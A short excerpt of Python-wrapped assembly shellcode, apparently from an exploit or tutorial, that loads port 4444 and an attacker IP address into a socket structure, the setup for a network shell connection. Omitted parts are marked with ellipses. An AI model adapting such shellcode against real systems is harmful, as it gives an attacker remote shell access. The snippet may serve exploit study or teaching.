...
shellcode = asm(''
    ...
    + 'mov word ptr [rsp+2], 0x5c11 ;' # port 4444
    + 'mov dword ptr [rsp+4], 0x12345678 ;' # ip address 120.86.52.18
    + 'xor edx, edx;'
